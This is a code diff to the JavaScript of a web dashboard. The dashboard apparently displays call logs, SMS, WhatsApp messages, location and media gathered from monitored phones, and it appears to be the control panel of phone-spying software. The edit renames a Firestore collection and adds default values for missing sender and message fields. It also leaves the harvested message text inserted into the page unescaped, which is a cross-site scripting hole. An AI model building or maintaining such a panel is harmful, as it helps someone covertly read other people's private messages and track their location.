@@ -104,7 +104,7 @@
 
         function loadDeviceList() {
             let devices = new Set();
-            let collections = ['call_logs_v2', 'sms_logs_v2', 'whatsapp_logs_v2', 'device_location_v2', 'media_logs_v2'];
+            let collections = ['call_logs_v2', 'sms_logs_v2', 'whatsapp_logs', 'device_location_v2', 'media_logs_v2'];
             
             let loadedCount = 0;
             collections.forEach(col => {
@@ -183,13 +183,15 @@
                 document.getElementById('sms-box').innerHTML = html || "<p class='text-gray-500'>No SMS messages.</p>";
             });
 
-            // WhatsApp (v2)
-            db.collection('whatsapp_logs_v2').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
+            // WhatsApp Logs (Updated to 'whatsapp_logs')
+            db.collection('whatsapp_logs').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
                 let html = "";
                 snapshot.forEach(doc => {
                     let d = doc.data();
                     if (d.device_name === targetDev) {
-                        html += `<div class="border-b border-gray-700 pb-2"><b>${d.sender}:</b> ${d.message}</div>`;
+                        let senderName = d.sender || "Unknown Sender";
+                        let messageText = d.message || "No content";
+                        html += `<div class="border-b border-gray-700 pb-2"><b>${senderName}:</b> ${messageText}</div>`;
                     }
                 });
                 document.getElementById('whatsapp-box').innerHTML = html || "<p class='text-gray-500'>No WhatsApp messages.</p>";
